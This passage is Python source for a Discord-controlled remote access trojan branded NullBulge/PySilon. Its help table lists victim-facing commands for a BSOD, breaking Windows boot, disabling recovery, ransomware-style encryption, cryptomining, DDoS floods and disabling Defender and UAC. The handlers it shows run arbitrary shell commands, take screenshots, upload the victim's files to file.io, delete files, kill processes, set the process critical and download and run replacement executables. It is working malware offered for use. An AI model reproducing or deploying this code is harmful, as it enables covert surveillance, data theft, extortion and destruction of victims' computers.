        'msg': [u'➡️ `.msg <parameters>`', u'Displays a custom message box to the victim\'s PC. Parameters:\n🔹text="" - The main text of the msg box\n🔹title="" - The title of the msg box\n🔹style="" - The msg box style (1, 2, 3, 4, 5, 6)'],
        'cmd': [u'➡️ `.cmd <command>`', u'Executes specified Command Prompt command on the victim\'s PC and sends back the output. Options:\n🔹command - a CMD command that will be executed on victim\'s PC'],
        'bsod': [u'➡️ `.bsod`', "Triggers a Blue Screen of Death on the victim's PC."],
        'jumpscare': [u'➡️ `.jumpscare`', 'Plays a very loud & rapidly flashing video.'],
        'break-windows': [u'➡️ `.break-windows`', 'Destroys Windows by renaming the boot manager. (Dangerous)'],
        'disable-reset': [u'➡️ `.disable-reset`', 'Disables windows recovery (ReAgentC)'],
        'enable-reset': [u'➡️ `.enable-reset`', 'Enables windows recovery (ReAgentC)'],
        'encrypt': [u'➡️ `.encrypt <option>`', 'Start - Encrypts every file in the current directory. Key - Get last used key. Note - Drop note'],
        'decrypt': [u'➡️ `.decrypt <directory>`', 'Decrypts every file in the specified directory'],
        'implode': [u'➡️ `.implode`', "Entirely wipes the malware off of the victim's PC (to remove traces)."],
    },
    'commands3': {
        'xmrig': [u'➡️ `.xmrig <action>`', u'Performs actions related to XMRig cryptocurrency miner. Options:\n🔹start - Start XMRig miner\n🔹output - Get the current output of XMRig\n🔹kill - Stop XMRig miner\n🔹delete - Delete XMRig files'],
        'ping': [u'➡️ `.ping <attack_type> <target>`', u'Performs a ping attack on the specified target. Attack Types:\n🔹request - HTTP Request Flood\n🔹synflood - SYN Flood\n🔹pyslow - Slowloris Attack'],
        'ping stop': [u'➡️ `.ping stop`', 'Stops the ongoing ping attack.'],
        'admin': [u'➡️ `.admin <option>`', u'Performs administrative actions on the victim\'s PC. Options:\n🔹defender on - Enable Windows Defender\n🔹defender off - Disable Windows Defender\n🔹defender disable - Completely Disable Windows Defender\n🔹defender enable - Enable Windows Defender (after complete disable)\n🔹taskmgr on - Enable Task Manager\n🔹taskmgr off - Disable Task Manager\n🔹uac on - Enable UAC popups\n🔹uac off - Disable UAC popups'],
        'update': [u'➡️ `.update <url>`', 'restarts the program after downloading and overwriting it with a new version.']
    }
}

@client.event
async def on_message(message):
    global cmd_messages  # inserted
    global keyboard_listener  # inserted
    global one_file_attachment_message  # inserted
    global expectation  # inserted
    global tree_messages  # inserted
    global turned_off  # inserted
    global custom_message_to_send  # inserted
    global mouse_listener  # inserted
    global input_blocked  # inserted
    global clipper_stop  # inserted
    global process_to_kill  # inserted
    global processes_list  # inserted
    if message.author!= client.user:
        if message.content == f'<@{client.user.id}>':
            await client.get_channel(channel_ids['main']).send(f'<@{message.author.id}>')
        if message.channel.id in channel_ids.values():
            if message.content == '.implode':
                await message.delete()
                await message.channel.send('``` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` ```\n\n```Send here NullBulge.key generated along with RAT executable```\n\n')
                expectation = 'key'
            elif message.content == '.restart':
                await message.delete()
                await message.channel.send('```NullBulge will be restarted now... Stand by...```')
                os.startfile(f'C:\\Users\\{getuser()}\\{software_directory_name}\\{software_executable_name}')
                sys.exit(0)
            elif message.content.startswith('.update'):
                await message.delete()
                if len(message.content.split())!= 2:
                    await message.channel.send('```Usage: .update <direct_url_to_exe>```')
                else:  # inserted
                    url = message.content.split()[1]
                    try:
                        response = requests.get(url)
                        if response.status_code == 200:
                            with open(f'C:\\Users\\{getuser()}\\{software_directory_name}\\{software_executable_name}', 'wb') as file:
                                file.write(response.content)
                            await message.channel.send('```NullBulge will be updated and restarted now... Stand by...```')
                            os.startfile(f'C:\\Users\\{getuser()}\\{software_directory_name}\\{software_executable_name}')
                            sys.exit(0)
                        else:  # inserted
                            await message.channel.send('```Failed to download the update. Please check the URL and try again.```')
                    except Exception as e:
                        await message.channel.send(f'```An error occurred while updating NullBulge: {str(e)}```')
            elif message.content[:5] == '.help':
                await message.delete()
                if message.content.strip() == '.help':
                    embed = discord.Embed(title='List of all available commands', color=4848643)
                    for i in help['commands'].keys():
                        embed.add_field(name=help['commands'][i][0], value=help['commands'][i][1], inline=False)
                    await message.channel.send(embed=embed)
                    embed = discord.Embed(color=4848643)
                    for i in help['commands2'].keys():
                        embed.add_field(name=help['commands2'][i][0], value=help['commands2'][i][1], inline=False)
                    await message.channel.send(embed=embed)
                    embed = discord.Embed(color=4848643)
                    for i in help['commands3'].keys():
                        embed.add_field(name=help['commands3'][i][0], value=help['commands3'][i][1], inline=False)
                    await message.channel.send(embed=embed)
            elif message.content == '.set-critical':
                await message.delete()
                try:
                    ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
                    ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0
                    embed = discord.Embed(title='🟣 System', description='```Process elevated to critical status successfully.\nWarning: This critical process can cause of BSOD when the victim tries to shut down their system.```', colour=discord.Colour.purple())
                    embed.set_author(name='NullBulge-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                    reaction_msg = await message.channel.send(embed=embed)
                    await reaction_msg.add_reaction('🔴')
                except:
                    await message.channel.send('`Something went wrong while elevating the process`')
            elif message.content == '.unset-critical':
                await message.delete()
                try:
                    ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0)
                    embed = discord.Embed(title='🟣 System', description='```Successfully removed critical status from process.```', colour=discord.Colour.purple())
                    embed.set_author(name='NullBulge-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                    reaction_msg = await message.channel.send(embed=embed)
                    await reaction_msg.add_reaction('🔴')
                except:
                    await message.channel.send('`Something went wrong while removing critical status`')
            elif message.content == '.disable-reset':
                await message.delete()
                if IsAdmin():
                    subprocess.run('reagentc.exe /disable', creationflags=subprocess.CREATE_NO_WINDOW)
                    embed = discord.Embed(title='🟣 System', description='```Successfully disabled REAgentC.```', colour=discord.Colour.purple())
                    embed.set_author(name='NullBulge-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                    reaction_msg = await message.channel.send(embed=embed)
                    await reaction_msg.add_reaction('🔴')
                else:  # inserted
                    embed = discord.Embed(title='📛 Error', description='```Disabling REAgentC requires elevation.```', colour=discord.Colour.purple())
                    embed.set_author(name='NullBulge-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                    reaction_msg = await message.channel.send(embed=embed)
                    await reaction_msg.add_reaction('🔴')
            elif message.content == '.enable-reset':
                await message.delete()
                if IsAdmin():
                    subprocess.run('reagentc.exe /enable', creationflags=subprocess.CREATE_NO_WINDOW)
                    embed = discord.Embed(title='🟣 System', description='```Successfully enabled REAgentC.```', colour=discord.Colour.purple())
                    embed.set_author(name='NullBulge-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                    reaction_msg = await message.channel.send(embed=embed)
                    await reaction_msg.add_reaction('🔴')
                else:  # inserted
                    embed = discord.Embed(title='📛 Error', description='```Enabling REAgentC requires elevation.```', colour=discord.Colour.purple())
                    embed.set_author(name='NullBulge-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                    reaction_msg = await message.channel.send(embed=embed)
                    await reaction_msg.add_reaction('🔴')
            elif expectation == 'key':
                try:
                    split_v1 = str(message.attachments).split('filename=\'')[1]
                    filename = str(split_v1).split('\' ')[0]
                    filename = f'C:\\Users\\{getuser()}\\{software_directory_name}\\' + filename
                    await message.attachments[0].save(fp=filename)
                    if get_file_hash(filename) == secret_key:
                        reaction_msg = await message.channel.send('```You are authorized to remotely remove NullBulge RAT from target PC. Everything related to NullBulge will be erased after you confirm this action by reacting with \"💀\".\nWARNING! This cannot be undone after you decide to proceed. You can cancel it, by reacting with \"🔴\".```')
                        await reaction_msg.add_reaction('💀')
                        await reaction_msg.add_reaction('🔴')
                        expectation = 'implosion'
                    else:  # inserted
                        reaction_msg = await message.channel.send('```❗ Provided key is invalid```')
                        await reaction_msg.add_reaction('🔴')
                        expectation = None
                except Exception as err:
                    await message.channel.send(f'```❗ Something went wrong while fetching secret key...\n{str(err)}```')
                    expectation = None
            elif message.content == '.ss':
                await message.delete()
                ImageGrab.grab(all_screens=True).save(f'C:\\Users\\{getuser()}\\{software_directory_name}\\ss.png')
                reaction_msg = await message.channel.send(embed=discord.Embed(title=current_time() + ' `[On demand]`', color=34047).set_image(url='attachment://ss.png'), file=discord.File(f'C:\\Users\\{getuser()}\\{software_directory_name}\\ss.png'))
                await reaction_msg.add_reaction('📌')
                subprocess.run(f'del \"C:\\Users\\{getuser()}\\{software_directory_name}\\ss.png\"', shell=True)
            elif message.content[:9] == '.download':
                await message.delete()
                if message.channel.id == channel_ids['file']:
                    if message.content == '.download':
                        embed = discord.Embed(title='📛 Error', description='```Syntax: .download <file-or-directory>```', colour=discord.Colour.red())
                        embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                        reaction_msg = await message.channel.send(embed=embed)
                        await reaction_msg.add_reaction('🔴')
                    elif os.path.exists('/'.join(working_directory) + '/' + message.content[10:]):
                        target_file = '/'.join(working_directory) + '/' + message.content[10:]
                        if os.path.isdir(target_file):
                            target_file += '.zip'
                            with ZipFile(target_file, 'w') as zip:
                                for file in get_all_file_paths('.'.join(target_file.split('.')[:(-1)])):
                                    try:
                                        zip.write(file)
                                    except Exception as e:
                                        message.channel.send(e)
                                        continue
                        await message.channel.send('```Uploading to file.io... This can take a while depending on the file size, amount and the victim\'s internet speed..```')
                        data = {'file': open(target_file, 'rb')}
                        url = 'https://file.io/'
                        response = requests.post(url, files=data)
                        data = response.json()
                        embed = discord.Embed(title=f'🟢 {message.content[10:]}', description=f"Click [here](<{data['link']}>) to download.", colour=discord.Colour.green())
                        embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                        await message.channel.send(embed=embed)
                        await message.channel.send('Warning: The file will be removed from file.io right after the first download.')
                    else:  # inserted
                        embed = discord.Embed(title='📛 Error', description='```❗ File or directory not found.```', colour=discord.Colour.red())
                        embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                        reaction_msg = await message.channel.send(embed=embed)
                        await reaction_msg.add_reaction('🔴')
                else:  # inserted
                    embed = discord.Embed(title='📛 Error', description='_ _\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||', colour=discord.Colour.red())
                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                    reaction_msg = await message.channel.send(embed=embed)
                    await reaction_msg.add_reaction('🔴')
            elif message.content == '.done':
                await message.delete()
                if expectation == 'multiplefiles':
                    files_to_merge[0].append(await message.channel.send('```This files will be uploaded and merged into  ' + '/'.join(working_directory) + '/' + files_to_merge[2] + '  after you react with 📤 to this message, or with 🔴 to cancel this operation```'))
                    await files_to_merge[0][(-1)].add_reaction('📤')
                    await files_to_merge[0][(-1)].add_reaction('🔴')
            elif message.content[:7] == '.upload':
                await message.delete()
                if message.channel.id == channel_ids['file']:
                    if message.content.strip() == '.upload':
                        reaction_msg = await message.channel.send('```Syntax: .upload <type> [name]\nTypes:\n    single - upload one file with size less than 25MB\n    multiple - upload multiple files prepared by Splitter with total size greater than 25MB```')
                        await reaction_msg.add_reaction('🔴')
                    else:  # inserted
                        if message.content[8:] == 'single':
                            expectation = 'onefile'
                            await message.channel.send('```Please send here a file to upload.```')
                        else:  # inserted
                            if message.content[8:16] == 'multiple' and len(message.content) > 17:
                                expectation = 'multiplefiles'
                                files_to_merge[2] = message.content[17:]
                                files_to_merge[0].append(await message.channel.send('```Please send here all files (one-by-one) prepared by Splitter and then type  .done```'))
                            else:  # inserted
                                reaction_msg = await message.channel.send('```Syntax: .upload multiple <name>```')
                                await reaction_msg.add_reaction('🔴')
                else:  # inserted
                    reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||')
                    await reaction_msg.add_reaction('🔴')
            elif message.content[:7] == '.remove':
                await message.delete()
                if message.channel.id == channel_ids['file']:
                    if message.content.strip() == '.remove':
                        embed = discord.Embed(title='📛 Error', description='```Syntax: .remove <file-or-directory>```', colour=discord.Colour.red())
                        embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                        reaction_msg = await message.channel.send(embed=embed)
                        await reaction_msg.add_reaction('🔴')
                    else:  # inserted
                        if os.path.exists('/'.join(working_directory) + '/' + message.content[8:]):
                            try:
                                if os.path.isfile('/'.join(working_directory) + '/' + message.content[8:]):
                                    subprocess.run('del \"' + '\\'.join(working_directory) + '\\' + message.content[8:] + '\"', shell=True)
                                else:  # inserted
                                    rmtree('/'.join(working_directory) + '/' + message.content[8:])
                                embed = discord.Embed(title='🟢 Success', description='```Successfully removed  ' + '/'.join(working_directory) + '/' + message.content[8:] + '  from target PC```', colour=discord.Colour.green())
                                embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                                reaction_msg = await message.channel.send(embed=embed)
                                await reaction_msg.add_reaction('🔴')
                            except Exception as error:
                                embed = discord.Embed(title='📛 Error', description='`' + str(error) + '`', colour=discord.Colour.red())
                                embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                                reaction_msg = await message.channel.send(embed=embed)
                                await reaction_msg.add_reaction('🔴')
                        else:
                            embed = discord.Embed(title='📛 Error', description='```❗ File or directory not found.```', colour=discord.Colour.red())
                            embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                            reaction_msg = await message.channel.send(embed=embed)
                            await reaction_msg.add_reaction('🔴')
                else:  # inserted
                    embed = discord.Embed(title='📛 Error', description='||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||', colour=discord.Colour.red())
                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                    reaction_msg = await message.channel.send(embed=embed)
                    await reaction_msg.add_reaction('🔴')
            elif message.content == '.clear':
                await message.delete()
                if message.channel.id == channel_ids['file']:
                    async for message in client.get_channel(channel_ids['file']).history():
                        await message.delete()
                else:  # inserted
                    reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||')
                    await reaction_msg.add_reaction('🔴')
            elif message.content == '.tree':
                await message.delete()
                if message.channel.id == channel_ids['file']:
                    tree_messages = []
                    tree_txt_path = f'C:\\Users\\{getuser()}\\{software_directory_name}\\' + 'tree.txt'
                    dir_path = Path('/'.join(working_directory))
                    tree_messages.append(await message.channel.send('```Directory tree requested by ' + str(message.author) + '\n\n' + '/'.join(working_directory) + '```'))
                    with open(tree_txt_path, 'w', encoding='utf-8') as system_tree:
                        system_tree.write(str(dir_path) + '\n')
                    length_limit = sys.maxsize
                    iterator = tree(Path('/'.join(working_directory)))
                    tree_message_content = '```^\n'
                    for line in islice(iterator, length_limit):
                        with open(tree_txt_path, 'a+', encoding='utf-8') as system_tree:
                            system_tree.write(line + '\n')
                        if len(tree_message_content) > 1800:
                            tree_messages.append(await message.channel.send(tree_message_content + str(line) + '```'))
                            tree_message_content = '```'
                        else:  # inserted
                            tree_message_content += str(line) + '\n'
                    if tree_message_content!= '```':
                        tree_messages.append(await message.channel.send(tree_message_content + '```'))
                    reaction_msg = await message.channel.send('```End of tree. React with 📥 to download this tree as .txt file, or with 🔴 to clear all above messages```')
                    await reaction_msg.add_reaction('📥')
                    await reaction_msg.add_reaction('🔴')
                else:  # inserted
                    reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||')
                    await reaction_msg.add_reaction('🔴')
            elif message.content[:3] == '.cd':
                await message.delete()
                if message.channel.id == channel_ids['file']:
                    if message.content.strip() == '.cd':
                        reaction_msg = await message.channel.send('```Syntax: .cd <directory>```')
                        await reaction_msg.add_reaction('🔴')
                    else:  # inserted
                        if os.path.isdir('/'.join(working_directory) + '/' + message.content[4:]):
                            if '/' in message.content:
                                for dir in message.content[4:].split('/'):
                                    if dir == '..':
                                        working_directory.pop((-1))
                                    else:  # inserted
                                        working_directory.append(dir)
                            else:  # inserted
                                if message.content[4:] == '..':
                                    working_directory.pop((-1))
                                else:  # inserted
                                    working_directory.append(message.content[4:])
                            reaction_msg = await message.channel.send('```You are now in: ' + '/'.join(working_directory) + '```')
                            await reaction_msg.add_reaction('🔴')
                        else:  # inserted
                            if os.path.isdir(message.content[4:]):
                                working_directory.clear()
                                for dir in message.content[4:].split('/'):
                                    working_directory.append(dir)
                                reaction_msg = await message.channel.send('```You are now in: ' + '/'.join(working_directory) + '```')
                                await reaction_msg.add_reaction('🔴')
                            else:  # inserted
                                reaction_msg = await message.channel.send('```❗ Directory not found.```')
                                await reaction_msg.add_reaction('🔴')
                else:  # inserted
                    reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||')
                    await reaction_msg.add_reaction('🔴')
            elif message.content == '.ls':
                await message.delete()
                if message.channel.id == channel_ids['file']:
                    dir_content_f, dir_content_d, directory_content = ([], [], [])
                    for element in os.listdir('/'.join(working_directory) + '/'):
                        if os.path.isfile('/'.join(working_directory) + '/' + element):
                            dir_content_f.append(element) 
                        else:  # inserted
                            dir_content_d.append(element)
                    dir_content_d.sort(key=str.casefold)
                    dir_content_f.sort(key=str.casefold)
                    for single_directory in dir_content_d:
                        directory_content.append(single_directory)
                    for single_file in dir_content_f:
                        directory_content.append(single_file)
                    await message.channel.send('```Content of ' + '/'.join(working_directory) + '/ at ' + current_time() + '```')
                    lsoutput = directory_content
                    while lsoutput!= []:
                        if len('\n'.join(lsoutput)) > 1994:
                            temp = ''
                            while len(temp + lsoutput[0]) + 1 < 1994:
                                temp += lsoutput[0] + '\n'
                                lsoutput.pop(0)
                            await message.channel.send('```' + temp + '```')
                        else:  # inserted
                            await message.channel.send('```' + '\n'.join(lsoutput) + '```')
                            lsoutput = []
                else:  # inserted
                    reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||')
                    await reaction_msg.add_reaction('🔴')
            elif message.content == '.pwd':
                await message.delete()
                if message.channel.id == channel_ids['file']:
                    reaction_msg = await message.channel.send('```You are now in: ' + '/'.join(working_directory) + '```')
                    await reaction_msg.add_reaction('🔴')
                else:  # inserted
                    reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||')
                    await reaction_msg.add_reaction('🔴')
            elif message.content[:5] == '.show':
                await message.delete()
                if message.content.strip() == '.show':
                    embed = discord.Embed(title='📛 Error', description='```Syntax: .show <what-to-show>```', colour=discord.Colour.red())
                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                    reaction_msg = await message.channel.send(embed=embed)
                    await reaction_msg.add_reaction('🔴')
                else:  # inserted
                    if message.content[6:] == 'processes':
                        processes, processes_list = ([], [])
                        for proc in process_iter():
                            processes.append(proc.name())
                        processes.sort(key=str.lower)
                        how_many, temp = (1, processes[0])
                        processes.pop(0)
                        for i in processes:
                            if temp == i:
                                how_many += 1
                                continue
                            
                            if how_many == 1:
                                processes_list.append('``' + temp + '``')
                            else:
                                processes_list.append('``' + temp + '``   [x' + str(how_many) + ']')
                                how_many = 1
                            temp = i
                        total_processes = len(processes)
                        processes = ''
                        reaction_msg = await message.channel.send('```Processes at ' + current_time() + ' requested by ' + str(message.author) + '```')
                        processes_messages.append(reaction_msg)
                        for proc in range(1, len(processes_list)):
                            if len(processes) < 1800:
                                processes = processes + '\n**' + str(proc) + ') **' + str(processes_list[proc])
                            else:  # inserted
                                processes += '\n**' + str(proc) + ') **' + str(processes_list[proc])
                                reaction_msg = await message.channel.send(processes)
                                processes_messages.append(reaction_msg)
                                processes = ''
                        reaction_msg = await message.channel.send(processes + '\n Total processes:** ' + str(total_processes) + '**\n```If you want to kill a process, type  .kill <process-number>```')
                        processes_messages.append(reaction_msg)
                        await reaction_msg.add_reaction('🔴')
            elif message.content == '.foreground':
                await message.delete()
                foreground_process = active_window_process_name()
                if foreground_process == None:
                    embed = discord.Embed(title='📛 Error', description='```Failed to get foreground window process name.```', colour=discord.Colour.red())
                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                    reaction_msg = await message.channel.send(embed=embed)
                    await reaction_msg.add_reaction('🔴')
                else:  # inserted
                    embed = discord.Embed(title=str(foreground_process), description=f'```You can kill it with -> .kill {foreground_process}```', colour=discord.Colour.green())
                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                    reaction_msg = await message.channel.send(embed=embed)
                    await reaction_msg.add_reaction('🔴')
            elif message.content[:10] == '.blacklist':
                await message.delete()
                if message.content.strip() == '.blacklist':
                    embed = discord.Embed(title='📛 Error', description='```Syntax: .blacklist <process-name>```', colour=discord.Colour.red())
                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                    reaction_msg = await message.channel.send(embed=embed)
                    await reaction_msg.add_reaction('🔴')
                else:  # inserted
                    if not os.path.exists(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln'):
                        with open(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln', 'w', encoding='utf-8'):
                            pass  # postinserted
                    with open(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln', 'r', encoding='utf-8') as disabled_processes:
                        disabled_processes_list = disabled_processes.readlines()
                    for x, y in enumerate(disabled_processes_list):
                        disabled_processes_list[x] = y.replace('\n', '')
                    if message.content[11:] not in disabled_processes_list:
                        disabled_processes_list.append(message.content[11:])
                        with open(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln', 'w', encoding='utf-8') as disabled_processes:
                            disabled_processes.write('\n'.join(disabled_processes_list))
                        embed = discord.Embed(title='🟢 Success', description=f'```{message.content[11:]} has been added to process blacklist```', colour=discord.Colour.green())
                        embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                        reaction_msg = await message.channel.send(embed=embed)
                        await reaction_msg.add_reaction('🔴')
                    else:  # inserted
                        embed = discord.Embed(title='📛 Error', description='```This process is already blacklisted, so there\'s nothing to disable```', colour=discord.Colour.red())
                        embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                        reaction_msg = await message.channel.send(embed=embed)
                        await reaction_msg.add_reaction('🔴')
            elif message.content[:10] == '.whitelist':
                await message.delete()
                if message.content.strip() == '.whitelist':
                    embed = discord.Embed(title='📛 Error', description='```Syntax: .whitelist <process-name>```', colour=discord.Colour.red())
                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                    reaction_msg = await message.channel.send(embed=embed)
                    await reaction_msg.add_reaction('🔴')
                else:  # inserted
                    if not os.path.exists(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln'):
                        with open(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln', 'w', encoding='utf-8'):
                            pass  # postinserted
                    with open(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln', 'r', encoding='utf-8') as disabled_processes:
                        disabled_processes_list = disabled_processes.readlines()
                    for x, y in enumerate(disabled_processes_list):
                        disabled_processes_list[x] = y.replace('\n', '')
                    if message.content[11:] in disabled_processes_list:
                        disabled_processes_list.pop(disabled_processes_list.index(message.content[11:]))
                        with open(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln', 'w', encoding='utf-8') as disabled_processes:
                            disabled_processes.write('\n'.join(disabled_processes_list))
                        embed = discord.Embed(title='🟢 Success', description=f'```{message.content[11:]} has been removed from process blacklist```', colour=discord.Colour.green())
                        embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                        reaction_msg = await message.channel.send(embed=embed)
                        await reaction_msg.add_reaction('🔴')
                    else:  # inserted
                        embed = discord.Embed(title='📛 Error', description='```This process is not blacklisted```', colour=discord.Colour.red())
                        embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                        reaction_msg = await message.channel.send(embed=embed)
                        await reaction_msg.add_reaction('🔴')
            elif message.content[:5] == '.kill':
                await message.delete()
                if message.content.strip() == '.kill':
                    embed = discord.Embed(title='📛 Error', description='```Syntax: .kill <process-name-or-ID>```', colour=discord.Colour.red())
                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                    reaction_msg = await message.channel.send(embed=embed)
                    await reaction_msg.add_reaction('🔴')
                else:  # inserted
                    if check_int(message.content[6:]):
                        if len(processes_list) > 10:
                            if int(message.content[6:]) < len(processes_list) and int(message.content[6:]) > 0:
                                reaction_msg = await message.channel.send('```Do you really want to kill process: ' + processes_list[int(message.content[6:])].replace('`', '') + '\nReact with 💀 to kill it or 🔴 to cancel...```')
                                process_to_kill = [processes_list[int(message.content[6:])].replace('`', ''), False]
                                await reaction_msg.add_reaction('💀')
                                await reaction_msg.add_reaction('🔴')
                            else:  # inserted
                                embed = discord.Embed(title='📛 Error', description='```There isn\'t any process with that index. Range of process indexes is 1-' + str(len(processes_list) - 1) + '```', colour=discord.Colour.red())
                                embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                                reaction_msg = await message.channel.send(embed=embed)
                                await reaction_msg.add_reaction('🔴')
                        else:  # inserted
                            embed = discord.Embed(title='📛 Error', description='```You need to generate the processes list to use this feature\n.show processes```', colour=discord.Colour.red())
                            embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                            reaction_msg = await message.channel.send(embed=embed)
                            await reaction_msg.add_reaction('🔴')
                    else:  # inserted
                        if message.content[6:].lower() in [proc.name().lower() for proc in process_iter()]:
                            stdout = force_decode(subprocess.run(f'taskkill /f /IM {message.content[6:].lower()} /t', capture_output=True, shell=True).stdout).strip()
                            await asyncio.sleep(0.5)
                            if message.content[6:].lower() not in [proc.name().lower() for proc in process_iter()]:
                                embed = discord.Embed(title='🟢 Success', description=f'```Successfully killed {message.content[6:].lower()}```', colour=discord.Colour.green())
                                embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                                reaction_msg = await message.channel.send(embed=embed)
                                await reaction_msg.add_reaction('🔴')
                            else:  # inserted
                                embed = discord.Embed(title='📛 Error', description=f'```Tried to kill {message.content[6:]} but it\'s still running...```', colour=discord.Colour.red())
                                embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                                reaction_msg = await message.channel.send(embed=embed)
                                await reaction_msg.add_reaction('🔴')
                        else:  # inserted
                            embed = discord.Embed(title='📛 Error', description='```Invalid process name/ID. You can view all running processes by typing:\n.show processes```', colour=discord.Colour.red())
                            embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                            reaction_msg = await message.channel.send(embed=embed)
                            await reaction_msg.add_reaction('🔴')
            elif message.content[:4] == '.cmd':
                await message.delete()
                if message.content.strip() == '.cmd':
                    reaction_msg = await message.channel.send('```Syntax: .cmd <command>```')
                    await reaction_msg.add_reaction('🔴')
                else:  # inserted
                    cmd_output = force_decode(subprocess.run(message.content[5:], capture_output=True, shell=True).stdout).strip()
                    message_buffer, cmd_messages = ('', [])
                    reaction_msg = await message.channel.send('```Executed command: ' + message.content[5:] + '\nstdout:```')
                    cmd_messages.append(reaction_msg)
                    for line in range(1, len(cmd_output.split('\n'))):
                        if len(message_buffer) + len(cmd_output.split('\n')[line]) > 1950:
                            reaction_msg = await message.channel.send('```' + message_buffer + '```')
                            cmd_messages.append(reaction_msg)
                            message_buffer = cmd_output.split('\n')[line]
                        else:  # inserted
                            message_buffer += cmd_output.split('\n')[line] + '\n'
                    reaction_msg = await message.channel.send('```' + message_buffer + '```')
                    cmd_messages.append(reaction_msg)
                    reaction_msg = await message.channel.send('```End of command stdout```')
                    await reaction_msg.add_reaction('🔴')
            elif message.content[:8] == '.execute':
                await message.delete()
                if message.channel.id == channel_ids['file']:
                    if message.content.strip() == '.execute':
                        reaction_msg = await message.channel.send('```Syntax: .execute <filename>```')
                        await reaction_msg.add_reaction('🔴')
                    else:  # inserted
                        if os.path.exists('/'.join(working_directory) + '/' + message.content[9:]):
                            try:
                                file_extension = os.path.splitext(message.content[9:])[1]
                                subprocess.run('start \"\" \"' + '/'.join(working_directory) + '/' + message.content[9:] + '\"', shell=True)
                                await asyncio.sleep(1)
                                ImageGrab.grab(all_screens=True).save('ss.png')
